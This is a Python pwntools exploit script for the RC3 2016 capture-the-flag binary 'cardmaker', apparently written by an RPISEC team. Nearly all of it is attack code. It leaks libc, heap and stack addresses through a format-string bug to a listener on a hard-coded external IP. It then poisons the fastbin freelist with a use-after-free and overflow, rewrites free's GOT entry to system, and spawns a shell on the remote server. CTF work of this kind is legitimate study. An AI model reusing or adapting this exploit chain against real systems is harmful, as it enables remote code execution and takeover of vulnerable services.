"""

RC3 2016 pwn500 "cardmaker" exploit

  RPISEC - wait_what, jass93

"""

import time
import socket
from threading import Thread, Lock
from pwn import *

binary_path = './cardmaker'
libc_path = './libc-2.23.so'
remote_ip = 'cardmaker.ctf.rc3.club'
remote_port = 9887

leak_ip = '104.131.125.87'
leak_port = 4848

base_offset = 0x3c5780
free_got = 0x603018

LOCK = Lock()
LEAKS = []


def add(p, frm='F'*16, to='T'*16, addr='0:0', border='B', msglen=100, msg='M'*16):
    p.readuntil('Quit\n'); p.writeline('1')
    p.readuntil('from?\n'); p.writeline(frm)
    p.readuntil('to?\n'); p.writeline(to)
    p.readuntil('port)\n'); p.writeline(addr)
    p.readuntil('chars)\n'); p.writeline(border)
    p.readuntil('...?\n'); p.writeline(str(msglen))
    p.readuntil('line)\n'); p.writeline(msg)
    p.writeline('done.')

def send_card(p):
    p.readuntil('Quit\n'); p.writeline('5')

def change(p, n, value):
    p.readuntil('Quit\n'); p.writeline('3')
    p.writeline(str(n+1))
    p.writeline(value)

def delete(p, n):
    p.readuntil('Quit\n'); p.writeline('4')
    p.writeline(str(n))

def overflow(p, n, value):
    length = 1
    for i in range((len(value) / 2) + 1):
        change(p, n, 'A'*length)
        length += 2

    change(p, n, value)


def leak_stuff():
    LOCK.acquire()

    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('', 4848))

    s.listen(1)
    c, addr = s.accept()

    res = ''

    try:
        tmp = c.recv(1)
        while tmp != '':
            res += tmp
            tmp = c.recv(1)
    except:
        import traceback
        traceback.print_exc()
        pass

    res = res.split('0x')
    LEAKS.extend([int(x, 16) for x in [res[-23], res[5], res[7]]])
    LOCK.release()

def main(argc, argv):
    local = True
    if argc > 1:
        if argv[1] == 'gdb':
            local = 'gdb'
        else:
            local = 0

    t = Thread(target=leak_stuff)
    t.daemon = True
    t.start()

    if local:
        p = process(binary_path)
        if local == 'gdb':
            gdb.attach(p)
    else:
        p = remote(remote_ip, remote_port)

    time.sleep(.1)

    # leak stuff with format string bug
    #  note: ip addr must be < 15 chars long
    add(p, addr='%s:%d' % (leak_ip, leak_port), border='%p')
    send_card(p)

    # get the leaks from the listening thread
    LOCK.acquire()
    libc_leak, heap_leak, stack_leak = LEAKS

    if '\n' in p64(stack_leak):
        # fgets can't handle our address
        print 'Newline in stack address, rerun exploit'
        return

    libc = ELF(libc_path)
    libc.address = libc_leak - base_offset

    system = libc.symbols['system']
    binsh = libc.search('/bin/sh\0').next()

    if system < 0 or binsh < 0:
        print 'Leak failed, rerun exploit'
        return

    print 'Leaks:'
    print '-'*50
    print 'heap:   0x%08x' % heap_leak
    print 'stack:  0x%08x' % stack_leak
    print 'binsh:  0x%08x' % binsh
    print 'system: 0x%08x' % system
    print '-'*50

    # set up fake fastbin chunk
    pl = ''
    pl += p64(0)    # prev_size
    pl += p64(0x50) # size
    pl += p64(0)    # forward ptr

    # write fake fastbin chunk onto stack
    add(p, to=pl, msglen=32)

    # - free the buffer we just allocated
    # - the fastbin freelist will look like this:
    #       A -> 0
    #
    delete(p, 1)

    # - UAF + buffer overflow to overwrite the forward pointer of
    #    the freed chunk in the fastbin freelist and make it point
    #    to our fake chunk on the stack
    #
    # - now the fastbin freelist looks like:
    #     A -> [fake chunk on stack] -> 0
    #
    overflow(p, 0, p64(stack_leak))

    # - this allocation pops off the top of the fastbin freelist
    # - now it looks like:
    #   [fake chunk on stack] -> 0
    #
    add(p, msglen=32)

    # this again pops off the top of the freelist, which happens to
    #  be our fake chunk on the stack.  So we just got malloc to
    #  return us a stack pointer :)
    #
    add(p, msglen=32)

    # now we can use the 'heap' overflow to overwrite the contents
    #  pointer on one of the cards on the stack and point it into
    #  the got
    #
    overflow(p, 2, 'A'*112 + p64(free_got))

    # now that the contents pointer is pointing into the got, we
    #  can overwrite it to change free's got entry to point to
    #  system
    #
    change(p, 0, p64(system))

    # overwrite the contents of one of the cards with '/bin/sh'
    change(p, 2, '/bin/sh\0')

    # 'free' the overwritten card
    delete(p, 2)

    p.readuntil('delete: ')
    p.interactive()


if __name__ == '__main__':
    main(len(sys.argv), sys.argv)

